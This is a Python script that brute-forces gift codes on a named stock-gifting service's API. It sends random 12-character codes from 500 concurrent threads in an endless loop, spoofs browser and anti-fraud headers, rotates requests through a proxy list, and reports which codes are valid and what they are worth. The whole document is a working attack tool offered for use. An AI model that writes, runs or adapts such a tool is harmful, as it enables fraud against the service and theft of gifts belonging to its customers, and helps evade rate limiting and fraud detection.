import random
import string
import requests
import threading
import time

class Color:
    no_colored = "\033[0m"
    white_bold = "\033[1;37m"
    blue_bold = "\033[1;96m"
    green_bold = "\033[1;92m"
    red_bold = "\033[1;91m"
    yellow_bold = "\033[1;33m"

clear_screen = "\033c"   
content = f"""{Color.red_bold}
                               _..._       .-'''-.                  _________      __           __          .----.          __       
                   .---.    .-'_..._''.   '   _    \               /         |...-'  |`.   ...-'  |`.      / .--. \    ...-'  |`.    
                   |   |  .' .'      '.\/   /` '.   \    _..._    '-----.   .'|      |  |  |      |  |    ' '    ' '   |      |  |   
     _.._          |   | / .'          .   |     \  '  .'     '.      .'  .'  ....   |  |  ....   |  |    \ \    / /   ....   |  |   
   .' .._|         |   |. '            |   '      |  '.   .-.   .   .'  .'      -|   |  |    -|   |  |     `.`'--.'      -|   |  |   
   | '       __    |   || |            \    \     / / |  '   '  | .'  .'         |   |  |     |   |  |     / `'-. `.      |   |  |   
 __| |__  .:--.'.  |   || |             `.   ` ..' /  |  |   |  |'---'        ...'   `--'  ...'   `--'    ' /    `. \  ...'   `--'   
|__   __|/ |   \ | |   |. '                '-...-'`   |  |   |  |             |         |`.|         |`. / /       \ ' |         |`. 
   | |   `" __ | | |   | \ '.          .              |  |   |  |             ` --------\ |` --------\ || |         | |` --------\ | 
   | |    .'.''| | |   |  '. `._____.-'/              |  |   |  |              `---------'  `---------' | |         | | `---------'  
   | |   / /   | |_'---'    `-.______ /               |  |   |  |                                        \ \       / /               
   | |   \ \._,\ '/                  `                |  |   |  |                                         `.'-...-'.'                
   |_|    `--'  `"                                    '--'   '--'                                            `-...-'                 {Color.no_colored}"""
print(clear_screen)
print(content)
time.sleep(5)

proxy = set()
with open("proxies.txt","r", encoding='utf-8') as pfile:
    lines = pfile.readlines()
    for line in lines:
        proxy.add(line.strip())

def generate_random_string(length):
    characters = string.digits + string.ascii_uppercase
    return ''.join(random.choice(characters) for _ in range(length))

def make_request():
    CODE = generate_random_string(12)
    url = f"https://api.stockpile.com/app/api/gift/pub/{CODE}"
    
    headers = {
        "Host": "api.stockpile.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://www.stockpile.com",
        "platform": "WEB",
        "x-sp-token": "null",
        "nonce": "Mmx1OWE2eWlzand6cHV2c2xkMzg2MGZoemxxa2FvNnRvZHo1aDY1b2xwMWcwN78=",
        "x-sp-target-account-number": "null",
        "x-forter-token": "19361df6926b4d90beb95f643eeb097b_1693870967069__UDF43-m4_9ck",
        "Origin": "https://www.stockpile.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "TE": "trailers"
    }
    proxies = {
        'http': 'http://' + random.choice(list(proxy))
    }
    
    try:
        response = requests.get(url, headers=headers, proxies=proxies)
        if response.status_code == 200:
            response_data = response.json()
            valid = response_data["result"]["valid"]
            count = response_data["result"]["count"]
            if valid is not False:
                print(f"{Color.green_bold}{CODE}{Color.green_bold} | Valid:{valid} | Count:{count}")
            else:
                print(f"{Color.red_bold}{CODE}{Color.no_colored}")
        else:
            print(f"{Color.red_bold}{response.status_code}{Color.no_colored} {CODE}")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    num_initial_threads = 500 

    threads = []
    for _ in range(num_initial_threads):
        thread = threading.Thread(target=make_request)
        thread.start()
        threads.append(thread)

    while True:
        for thread in threads:
            if not thread.is_alive():
                thread.join()  
                new_thread = threading.Thread(target=make_request)
                new_thread.start()
                threads.remove(thread)
                threads.append(new_thread)
        time.sleep(1)
